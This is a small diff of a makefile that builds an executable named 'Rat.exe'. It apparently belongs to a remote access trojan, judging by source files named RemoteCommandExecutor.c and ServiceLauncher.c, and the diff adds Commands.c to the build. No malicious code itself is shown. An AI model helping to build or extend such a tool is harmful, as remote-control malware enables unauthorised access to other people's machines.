@@ -1,7 +1,7 @@
 COMPILER = cl.exe
 COMPILE_FLAGS = /Os /W1
 STATIC_LIBS = ws2_32.lib shell32.lib user32.lib advapi32.lib
-SOURCES = SocketUtil.c RemoteCommandExecutor.c ServiceLauncher.c Main.c
+SOURCES = Commands.c SocketUtil.c RemoteCommandExecutor.c ServiceLauncher.c Main.c
 EXECUTABLE_OUT = Rat.exe
 
 all:$(SOURCES)
